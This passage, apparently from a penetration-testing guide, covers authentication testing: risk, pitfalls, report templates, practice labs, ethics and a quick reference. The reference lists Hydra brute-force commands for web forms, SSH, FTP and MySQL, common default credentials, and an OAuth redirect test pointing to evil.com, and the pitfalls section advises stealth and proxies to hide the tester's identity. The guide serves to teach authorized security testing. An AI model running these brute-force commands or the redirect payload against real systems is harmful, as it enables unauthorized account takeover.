Authentication vulnerabilities can lead to unauthorized access. Brute-force attacks can compromise user accounts. Session vulnerabilities can lead to account takeover. MFA bypass can circumvent security controls.

### Indirect Impact

Authentication vulnerabilities enable further exploitation. Findings guide remediation efforts. Regular testing reduces attack surface. Automated testing enables continuous security assessment.

### Risk Quantification

Authentication bypass poses critical risk. Brute-force vulnerabilities create high risk. Session management issues enable medium to high risk. MFA bypass circumvents security controls.

### Business Impact

Comprehensive authentication testing improves security posture. Findings enable risk-based decision making. Regular testing supports compliance requirements. Automated testing reduces manual effort.

## Common Pitfalls

### Tool Configuration Errors

Incorrect credential lists cause test failures. Missing authentication endpoints prevent testing. Wrong login parameters miss functionality. Inadequate rate limits cause blocking.

### Result Processing Mistakes

Failure to deduplicate results inflates numbers. Not filtering false positives wastes time. Ignoring response patterns creates inaccurate assessments. Missing documentation complicates reporting.

### Scope Management Issues

Testing out-of-scope targets violates engagement rules. Not verifying authorization creates legal risks. Ignoring authentication boundaries leads to false assumptions. Failing to document scope complicates reporting.

### Resource Management Problems

Running too many authentication tests simultaneously causes network congestion. Not implementing proper error handling stops automation. Missing cleanup of temporary files wastes disk space. Inadequate logging prevents debugging.

### Security Awareness Gaps

Aggressive testing without authorization violates policies. Not using stealth techniques triggers security alerts. Ignoring rate limits causes IP blocking. Failing to use proxies exposes source identity.

## Integration Points

### CI/CD Pipeline Integration

Automate authentication testing in continuous integration pipelines. Trigger tests on code changes. Integrate results with security gates. Report findings to development teams.

### Vulnerability Scanner Integration

Feed authentication findings into vulnerability scanners. Prioritize scanning based on authentication sensitivity. Correlate findings with other testing. Update scanner targets automatically.

### Identity Provider Integration

Integrate with identity providers for testing. Use IdP APIs for authentication enumeration. Analyze IdP configurations. Test IdP security controls.

### Monitoring System Integration

Integrate with authentication monitoring systems. Set up alerts for suspicious authentication. Monitor for authentication changes. Track testing trends over time.

### Ticketing System Integration

Automatically create tickets for authentication vulnerabilities. Track remediation progress. Generate reports for security teams. Escalate critical findings.

## Reporting Templates

### Executive Summary

```
Authentication Testing Report
Date: [DATE]
Target: [SCOPE]
Tools Used: [LIST]
Total Authentication Mechanisms: [NUMBER]
Vulnerabilities Found: [NUMBER]
Critical: [NUMBER]
High: [NUMBER]
Medium: [NUMBER]
Low: [NUMBER]
Key Findings: [SUMMARY]
Risk Level: [LEVEL]
Recommendations: [LIST]
```

### Technical Details

```
Testing Methodology:
1. Discovery: [METHOD]
2. Brute-Force Testing: [TOOLS]
3. Session Testing: [APPROACH]
4. Protocol Testing: [METHOD]

Results Breakdown:
- Total Mechanisms: [NUMBER]
- Brute-Force Vulnerabilities: [NUMBER]
- Session Vulnerabilities: [NUMBER]
- Protocol Vulnerabilities: [NUMBER]
- Access Control Issues: [NUMBER]

Top Findings:
1. [FINDING 1]
2. [FINDING 2]
3. [FINDING 3]
```

### Raw Data Format

```
Mechanism,Type,Vulnerability,Severity,Status,Remediation
Login Form,Password,Brute-Force,HIGH,Open,Implement rate limiting
JWT,Token,Algorithm Confusion,CRITICAL,Open,Validate algorithm
OAuth,Protocol,Redirect URI Bypass,HIGH,Open,Validate redirect URI
Session,Token,Session Fixation,MEDIUM,Open,Regenerate session ID
```

## Practice Labs

### Lab 1: Brute-Force Testing

**Setup:** Create a web application with login functionality
**Exercise:** Use Hydra for brute-force testing
**Goal:** Identify brute-force vulnerabilities

### Lab 2: Session Testing

**Setup:** Application with session management
**Exercise:** Test session token entropy and fixation
**Goal:** Identify session vulnerabilities

### Lab 3: JWT Testing

**Setup:** API with JWT authentication
**Exercise:** Test JWT manipulation and vulnerabilities
**Goal:** Identify JWT vulnerabilities

### Lab 4: OAuth Testing

**Setup:** Application with OAuth authentication
**Exercise:** Test OAuth implementation for vulnerabilities
**Goal:** Identify OAuth vulnerabilities

## Ethics

Authentication testing must be performed within legal and ethical boundaries. Always obtain written authorization before testing any authentication mechanism. Respect rate limits and do not cause denial of service. Do not test authentication mechanisms outside the authorized scope. Use appropriate testing techniques for the environment. Store test results securely and do not expose sensitive information. Follow responsible disclosure practices for vulnerabilities discovered. Comply with all applicable laws and regulations. Respect privacy and do not test personal applications without consent. Document all activities for audit purposes and accountability.

## Quick Reference

### Essential Commands

```bash
# Basic brute-force
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# SSH brute-force
hydra -l admin -P wordlist.txt target.com ssh

# FTP brute-force
hydra -l admin -P wordlist.txt target.com ftp

# MySQL brute-force
hydra -l admin -P wordlist.txt target.com mysql

# Login attempt
curl -d "username=admin&password=password" https://target.com/login

# Test session
curl -b "session=abc123" https://target.com/dashboard

# Test JWT
curl -H "Authorization: Bearer token" https://target.com/api

# Test OAuth
curl "https://target.com/oauth/authorize?client_id=client&redirect_uri=https://evil.com&response_type=code"
```

### Tool Comparison

| Tool | Type | Speed | Protocols | Ease |
|------|------|-------|-----------|------|
| Hydra | Brute-Force | Fast | Multiple | Medium |
| Medusa | Brute-Force | Fast | Multiple | Medium |
| Ncrack | Network | Fast | Multiple | Medium |
| curl | Manual | Slow | HTTP | High |
| Python | Automation | Fast | Custom | Medium |

### Common Credentials

```
Usernames:
- admin
- root
- user
- test
- guest
- administrator
- manager
- support

Passwords:
- password
- 123456
- admin
- root
- test
- guest
- letmein
- welcome
```

### Authentication Protocols

```
HTTP:
- Basic Auth
- Digest Auth
- NTLM
- Negotiate

Token:
- JWT
- OAuth
- SAML
- API Key

Session:
- Cookie
- Session ID
- CSRF Token

MFA:
- SMS
- TOTP
- Push Notification
- Hardware Token
```

### Response Codes

```
200: OK - Login successful
301: Moved Permanently - Redirect
302: Found - Redirect
400: Bad Request - Invalid request
401: Unauthorized - Authentication required
403: Forbidden - Access denied
404: Not Found - Login endpoint not found
405: Method Not Allowed - Wrong HTTP method
429: Too Many Requests - Rate limited
500: Server Error - Login processing error
```

### Testing Workflow

```
1. Discovery:
   - Find authentication endpoints
   - Analyze authentication mechanisms
   - Document authentication flows

2. Testing:
   - Brute-force testing
   - Session testing
   - Protocol testing
   - Access control testing

3. Analysis:
   - Response analysis
   - Vulnerability identification
   - Risk assessment
   - Documentation

4. Validation:
   - Manual verification
   - Impact assessment
   - Remediation recommendations
```

### Debugging Commands

```bash
# Verbose curl
curl -v -d "username=admin&password=password" https://target.com/login

# Debug curl
curl -v -d "username=admin&password=password" https://target.com/login

# Test connectivity
ping target.com

# Test DNS
nslookup target.com

# Test SSL
openssl s_client -connect target.com:443

# Test login endpoint
curl -I https://target.com/login

# Check response headers
curl -I -d "username=admin&password=password" https://target.com/login

# Check response body
curl -s -d "username=admin&password=password" https://target.com/login

# Check for errors
curl -s -d "username=admin&password=password" https://target.com/login | jq '.error'

# Check for success
curl -s -d "username=admin&password=password" https://target.com/login | jq '.success'
```
